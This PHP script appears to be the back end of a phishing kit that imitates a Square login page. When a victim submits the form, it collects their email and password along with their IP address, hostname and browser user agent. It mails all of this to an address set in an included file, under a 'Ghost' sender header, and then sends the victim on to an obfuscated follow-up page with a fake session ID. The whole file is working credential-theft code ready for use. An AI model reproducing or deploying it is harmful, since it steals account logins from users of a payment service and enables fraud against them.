<?php


if($_POST["email"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Square Login Info-----------------------\n";
$message .= "Email            : ".$_POST['email']."\n";
$message .= "Password           : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- GHOST --------------|\n";
$subject = "Square Login| ".$_POST['email']." | $ip";
$headers = "From: Ghost - Square Login 1 <k1r4@app-crew.id>";
include 'email.php';
{
mail($to, $subject, $message, $headers);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: secjhdjrhgyg87g85yg85yuryhfjhgtjbhjfhbjgbhutyb8t8ybughbjgj.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: lojhjfhg587g85g7hfghifg58g7h5h58g.php");
}

?>